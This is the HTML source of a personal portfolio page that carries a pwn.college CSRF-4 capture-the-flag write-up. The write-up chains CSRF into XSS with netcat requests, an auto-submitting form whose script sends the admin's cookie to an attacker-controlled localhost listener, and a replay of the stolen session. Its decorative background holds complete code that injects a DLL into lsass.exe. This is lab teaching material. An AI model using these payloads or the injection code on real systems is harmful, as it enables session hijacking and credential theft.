@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF-4 Write-up — pwn.college</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="CSRF-4 Write-up — pwn.college" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>CSRF-4 Write-up — pwn.college</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-goal">🧠 Goal</h2>
+
+<p>Use a <strong>CSRF (Cross-Site Request Forgery)</strong> vulnerability to trick the admin into executing an XSS payload by embedding a malicious iframe in your post. The iframe hosts an HTML file that auto-submits a form with the payload.</p>
+
+<hr />
+
+<h2 id="️-step-by-step-exploitation">🛠️ Step-by-Step Exploitation</h2>
+
+<h3 id="1-create-a-post-with-an-iframe-to-your-server">1. Create a post with an iframe to your server</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&amp;publish=on"</span>
+<span class="nv">LENGTH</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span> | <span class="nb">wc</span> <span class="nt">-c</span><span class="si">)</span>
+
+<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"POST /draft HTTP/1.0</span><span class="se">\r</span><span class="s2">
+Host: challenge.localhost</span><span class="se">\r</span><span class="s2">
+Cookie: auth=hacker|1337</span><span class="se">\r</span><span class="s2">
+Content-Type: application/x-www-form-urlencoded</span><span class="se">\r</span><span class="s2">
+Content-Length: </span><span class="nv">$LENGTH</span><span class="se">\r</span><span class="s2">
+</span><span class="se">\r</span><span class="s2">
+</span><span class="nv">$PAYLOAD</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>This publishes a post with a hidden &lt;iframe&gt; pointing to your server on port 1337.</p>
+
+<h3 id="2-create-a-malicious-indexhtml-payload">2. Create a malicious index.html payload</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span><span class="nt">--</span> index.html <span class="nt">--</span><span class="o">&gt;</span>
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"http://challenge.localhost/ephemeral"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"GET"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"csrfForm"</span><span class="o">&gt;</span>
+      &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"msg"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"&lt;script&gt;fetch('http://hacker.localhost:1338/?c='+document.cookie)&lt;/script&gt;"</span><span class="o">&gt;</span>
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.getElementById<span class="o">(</span><span class="s1">'csrfForm'</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+<p>Save this to index.html in the same directory where you will run your HTTP server.</p>
+
+<h3 id="3-start-the-malicious-server">3. Start the malicious server</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 1337
+</code></pre></div></div>
+<p>This will serve your malicious index.html page to the admin when they visit your iframe.</p>
+
+<h3 id="4-trigger-the-admin-to-visit-the-post">4. Trigger the admin to visit the post</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/challenge/victim
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Visiting http://challenge.localhost:80/
+Logging <span class="k">in </span>as admin...
+Visited the attacker<span class="s1">'s website (http://hacker.localhost:1337/)...
+Visited! Go check if the attack worked!
+</span></code></pre></div></div>
+<h3 id="5-capture-the-stolen-cookie">5. Capture the stolen cookie</h3>
+<p>In another terminal:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 1338
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?c<span class="o">=</span><span class="nv">auth</span><span class="o">=</span>admin|.QX5kzMzwSM0IzMyEzW<span class="o">}</span> HTTP/1.1
+</code></pre></div></div>
+<p>You have successfully stolen the admin’s session cookie.</p>
+
+<h3 id="6-use-the-stolen-admin-cookie">6. Use the stolen admin cookie</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET / HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n</span><span class="s2">Cookie: auth=admin|.QX5kzMzwSM0IzMyEzW}</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>This returns:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h2&gt;Author: admin&lt;/h2&gt;&lt;b&gt;YOUR POST:&lt;/b&gt; pwn.college<span class="o">{</span>csAoPfax0C99uPTOPNas95n4QSq.QX5kzMzwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>csAoPfax0C99uPTOPNas95n4QSq.QX5kzMzwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
